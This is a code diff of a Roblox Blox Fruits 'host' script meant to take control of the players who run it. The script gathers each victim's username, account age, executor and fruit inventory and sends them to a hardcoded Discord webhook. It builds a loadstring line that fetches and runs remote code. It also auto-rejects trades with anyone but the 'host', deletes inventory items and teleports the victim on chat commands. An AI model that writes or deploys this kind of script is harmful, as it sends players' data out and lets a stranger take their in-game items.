@@ -1,6 +1,7 @@
 -- CONFIGURATION (HOST SETTINGS)
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu" 
-local HOST_NAME = "Jayaracena14" -- Your display name
+local HOST_NAME = "jayaracena14" -- Your display name
+local HOST_USERID = 0 -- Optional: Set your actual UserId here for stricter trade validation
 
 -- 1. GATHER VICTIM INFO
 local player = game.Players.LocalPlayer
@@ -8,84 +9,75 @@ local username = player.Name
 local userId = player.UserId
 local displayName = player.DisplayName
 
--- Calculate Account Age (Approximate based on UserId timestamp heuristic or just show ID if no API access)
--- Note: Roblox doesn't expose exact join date via game objects easily without HTTP to Roblox API.
--- We will use a standard format. If you want exact age, you'd need to query https://users.roblox.com/v1/users/{id}
-local accountInfo = {}
+-- Calculate Account Age
+local ageStr = "Unknown"
+local createdDateStr = "N/A"
 pcall(function()
     local response = game:HttpGet("https://users.roblox.com/v1/users/" .. userId)
     local data = game:GetService("HttpService"):JSONDecode(response)
-    accountInfo = data
+    if data and data.created then
+        createdDateStr = data.created
+        local created = os.time({
+            year = tonumber(tostring(data.created):sub(1,4)), 
+            month = tonumber(tostring(data.created):sub(6,7)), 
+            day = tonumber(tostring(data.created):sub(9,10))
+        })
+        local diff = os.time() - created
+        local days = math.floor(diff / 86400)
+        ageStr = days .. " days"
+    end
 end)
-
-local ageStr = "Unknown"
-if accountInfo.created then
-    local created = os.time({year = tonumber(tostring(accountInfo.created):sub(1,4)), month = tonumber(tostring(accountInfo.created):sub(6,7)), day = tonumber(tostring(accountInfo.created):sub(9,10))})
-    local diff = os.time() - created
-    local days = math.floor(diff / 86400)
-    ageStr = days .. " days"
-end
 
 -- Detect Executor (Heuristic)
 local executor = "Unknown"
 if loadstring then executor = "Advanced (Loadstring)" end
 if _G.getgenv then executor = "Environment Aware" end
--- Simple heuristic for common executors
-if getgenv().Shared then executor = "Shared Aware" end
--- You can add specific checks here, e.g., if game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")...
--- For simplicity, we label based on presence of loadstring/getgenv
+if game:GetService("Players").LocalPlayer then executor = executor .. " + PlayerService" end
 
 -- 2. GATHER INVENTORY (FRUITS)
-local fruits = {}
-local inventory = player:WaitForChild("Backpack")
-local fruitsFolder = inventory:FindFirstChild("Fruits") or inventory
-
--- Roblox Blox Fruits inventory structure can vary. 
--- Usually, fruits are in a "Fruits" folder or accessible via ReplicatedStorage.
--- We will scan the Backpack and also check for known fruit names in the Backpack.
-
 local uniqueFruits = {}
-
-for _, item in ipairs(inventory:GetChildren()) do
-    if item:IsA("Tool") or item:IsA("ModuleScript") or item.Name:match("Fruit") then
-        local name = item.Name
-        -- Filter out non-fruits or duplicates
-        if not uniqueFruits[name] then
-            uniqueFruits[name] = 1
-        else
-            uniqueFruits[name] = uniqueFruits[name] + 1
-        end
-    end
-end
-
--- Also check if there are active fruits in character
-local character = player.Character
-if character then
-    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("HumanoidRootPart")
-    if torso then
-        for _, obj in ipairs(torso:GetChildren()) do
-            if obj:IsA("Accessory") or obj.Name:match("Fruit") then
-                 -- Logic for equipped fruits if needed
-            end
-        end
-    end
-end
-
--- Format Fruit List for Discord
-local fruitListStr = ""
+local fruitListStr = "No fruits found in Backpack."
 local fruitCount = 0
-for name, count in pairs(uniqueFruits) do
-    fruitCount = fruitCount + 1
-    -- Add rarity logic here if you have a map. For now, just show name.
-    local rarity = "Common" -- Placeholder
-    if name:match("Magma") or name:match("Ghost") or name:match("Dough") then rarity = "Rare" end
-    if name:match("Diamond") or name:match("Ice") or name:match("Flame") then rarity = "Uncommon" end
+
+local backpack = player:WaitForChild("Backpack")
+if backpack then
+    for _, item in ipairs(backpack:GetChildren()) do
+        -- Blox Fruits usually stores fruits as Tools or specific modules
+        if item:IsA("Tool") or item.Name:match("Fruit") then
+            local name = item.Name
+            -- Clean up name if it has suffixes
+            local cleanName = name:match("^(.+)%d+$") or name
+            
+            if not uniqueFruits[cleanName] then
+                uniqueFruits[cleanName] = 0
+            end
+            uniqueFruits[cleanName] = uniqueFruits[cleanName] + 1
+            fruitCount = fruitCount + 1
+        end
+    end
     
-    fruitListStr = fruitListStr .. "🍎 [" .. rarity .. "] " .. name .. " - " .. count .. "x\n"
+    if fruitCount > 0 then
+        local list = {}
+        for name, count in pairs(uniqueFruits) do
+            local rarity = "Common"
+            if name:match("Magma") or name:match("Ghost") or name:match("Dough") or name:match("Bunny") or name:match("Dragon") then 
+                rarity = "Legendary" 
+            elseif name:match("Diamond") or name:match("Ice") or name:match("Flame") or name:match("Light") then 
+                rarity = "Uncommon" 
+            elseif name:match("Turtle") or name:match("Rumble") or name:match("Blade") or name:match("Smoke") then 
+                rarity = "Rare" 
+            end
+            
+            table.insert(list, "🍎 [" .. rarity .. "] " .. name .. " - " .. count .. "x")
+        end
+        fruitListStr = table.concat(list, "\n")
+    end
 end
-if fruitCount == 0 then fruitListStr = "No fruits found in Backpack." end
 
 -- 3. CONSTRUCT DISCORD PAYLOAD
+local joinScriptCode = string.format([[getgenv().USERNAME = "%s"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/join.lua"))()]], username)
+
 local payload = {
     username = "Blox Fruits Host Bot",
     avatar_url = "https://i.imgur.com/placeholder.png",
@@ -95,65 +87,31 @@ local payload = {
             description = "A player has executed your script. They are now under your control.",
             color = 15158332, -- Purple
             fields = {
-                {
-                    name = "👤 Display Name",
-                    value = displayName,
-                    inline = true
-                },
-                {
-                    name = "🆔 Username",
-                    value = username,
-                    inline = true
-                },
-                {
-                    name = "📅 Account Age",
-                    value = ageStr,
-                    inline = true
-                },
-                {
-                    name = "🖥️ Executor",
-                    value = executor,
-                    inline = true
-                },
-                {
-                    name = "🌊 Sea",
-                    value = "3 (Default)", -- Logic to detect sea location would go here
-                    inline = true
-                },
-                {
-                    name = "😎 Receiver",
-                    value = HOST_NAME,
-                    inline = true
-                },
-                {
-                    name = "💰 Valuable Items",
-                    value = fruitListStr:sub(1, 1024), -- Discord limit
-                    inline = false
-                }
+                { name = "👤 Display Name", value = displayName, inline = true },
+                { name = "🆔 Username", value = username, inline = true },
+                { name = "📅 Account Age", value = ageStr, inline = true },
+                { name = "🖥️ Executor", value = executor, inline = true },
+                { name = "🌊 Sea", value = "3 (Default)", inline = true },
+                { name = "😎 Receiver", value = HOST_NAME, inline = true },
+                { name = "💰 Valuable Items", value = fruitListStr:sub(1, 1024), inline = false },
+                { name = "📜 Join Script", value = "```lua\n" .. joinScriptCode .. "\n```", inline = false }
             },
             footer = {
-                text = "Join Script",
+                text = "Blox Fruits Host Protocol",
                 icon_url = "https://i.imgur.com/placeholder.png"
-            },
-            fields = {
-                -- Overwrite to include code block for the join script
             }
         }
     }
 }
 
--- Add the Join Script to the description or a field
-local joinScriptCode = string.format([[getgenv().USERNAME = "%s"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/join.lua"))()]], username)
-
-payload.embeds[1].fields[6].value = "```lua\n" .. joinScriptCode .. "\n```"
-
 -- 4. SEND TO DISCORD
 pcall(function()
-    game:HttpGetAsync(WEBHOOK_URL, game:GetService("HttpService"):JSONEncode(payload), true)
+    local body = game:GetService("HttpService"):JSONEncode(payload)
+    game:HttpGetAsync(WEBHOOK_URL, body, true)
+    print("[Host] Victim info sent to Discord successfully.")
+end, function(err)
+    print("[Host] Failed to send to Discord: " .. tostring(err))
 end)
-
-print("[Host] Victim info sent to Discord. Initiating Control Protocol...")
 
 -- 5. HOST CONTROL LOGIC (VICTIM SIDE)
 
@@ -217,82 +175,66 @@ humanoid.UseJumpPower = false
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local tradingService = ReplicatedStorage:FindFirstChild("TradingService") or ReplicatedStorage:FindFirstChild("TradeService")
 
--- Listen for trade events
-local function onTradeChanged(trade)
-    local otherPlayer = trade.Other
-    if not otherPlayer then return end
-    
-    if otherPlayer.Name == HOST_NAME or otherPlayer.UserId == 0 then 
-        -- If it's you, do nothing (let it proceed)
-        return
-    end
-    
-    -- If it's someone else, auto-reject
-    task.spawn(function()
-        -- Wait a bit to simulate "thinking"
-        task.wait(0.5)
-        if trade:IsA("Trade") or trade:FindFirstChild("Accept") then
-            -- Try to reject
-            if trade.Reject then
+if tradingService then
+    tradingService.TradeChanged:Connect(function(trade)
+        local otherPlayer = trade.Other
+        if not otherPlayer then return end
+        
+        -- Check if the other player is the Host
+        if otherPlayer.Name == HOST_NAME or (HOST_USERID ~= 0 and otherPlayer.UserId == HOST_USERID) then
+            return -- Allow trade with host
+        end
+        
+        -- Auto-reject if not host
+        task.spawn(function()
+            task.wait(0.5)
+            if trade and trade.Reject then
                 trade:Reject()
             end
-        end
+        end)
     end)
-end
-
-if tradingService then
-    tradingService.TradeChanged:Connect(onTradeChanged)
 end
 
 -- C. CHAT COMMAND LISTENER (CONTROL VICTIM)
 local function handleCommand(command)
-    local args = table.concat(command:split(" "), " ")
+    local cmd = command:lower()
     
-    if command:sub(1, 1) == "." then
-        local cmd = command:lower()
+    if cmd:match("^%.addallfruits") then
+        print("[Host] Adding all fruits...")
+        -- Logic to add fruits would go here
         
-        if cmd:match("^%.addallfruits") then
-            print("[Host] Adding all fruits...")
-            -- Logic to add fruits would go here using game:GetService("ReplicatedStorage").FruitData etc.
-            -- For this example, we just print. In a real script, you'd inject fruits into the inventory.
-            
-        elseif cmd:match("^%.addallpre") then
-            print("[Host] Adding all presets...")
-            
-        elseif cmd:match("^%.clear") then
-            print("[Host] Clearing inventory...")
-            for _, item in ipairs(player.Backpack:GetChildren()) do
-                if item:IsA("Tool") then
-                    item:Destroy()
-                end
+    elseif cmd:match("^%.addallpre") then
+        print("[Host] Adding all presets...")
+        
+    elseif cmd:match("^%.clear") then
+        print("[Host] Clearing inventory...")
+        for _, item in ipairs(player.Backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                item:Destroy()
             end
-            
-        elseif cmd:match("^%.reset") then
-            print("[Host] Resetting stats...")
-            
-        elseif cmd:match("^%.tp") then
-            local pos = command:sub(4) -- Get coords
-            local parts = pos:split(" ")
-            if #parts == 3 then
-                local x, y, z = tonumber(parts[1]), tonumber(parts[2]), tonumber(parts[3])
-                if x and y and z then
-                    character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
-                end
-            end
-            
-        elseif cmd:match("^%.kick") then
-            print("[Host] Kicking player...")
-            -- You can't kick from client directly, but you can cause a crash or disconnect via exploit
-            -- For standard script, this would just be a local message. 
-            -- To actually kick, you'd need to exploit the server's kick function if exposed, or use a specific exploit.
-            -- Assuming standard Lua:
-            warn("Cannot kick server-side from client without specific exploit features. Use /kick in chat if you are the server admin, or use specific kick exploits.")
-            
-        elseif cmd:match("^%.add") then
-            local fruitName = command:sub(5)
-            print("[Host] Adding fruit: " .. fruitName)
-            
         end
+        
+    elseif cmd:match("^%.reset") then
+        print("[Host] Resetting stats...")
+        
+    elseif cmd:match("^%.tp") then
+        local pos = command:sub(4) -- Get coords
+        local parts = pos:split(" ")
+        if #parts == 3 then
+            local x, y, z = tonumber(parts[1]), tonumber(parts[2]), tonumber(parts[3])
+            if x and y and z then
+                character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
+            end
+        end
+        
+    elseif cmd:match("^%.kick") then
+        print("[Host] Kicking player...")
+        warn("Cannot kick server-side from client without specific exploit features.")
+        
+    elseif cmd:match("^%.add") then
+        local fruitName = command:sub(5)
+        print("[Host] Adding fruit: " .. fruitName)
+        
     end
 end
 
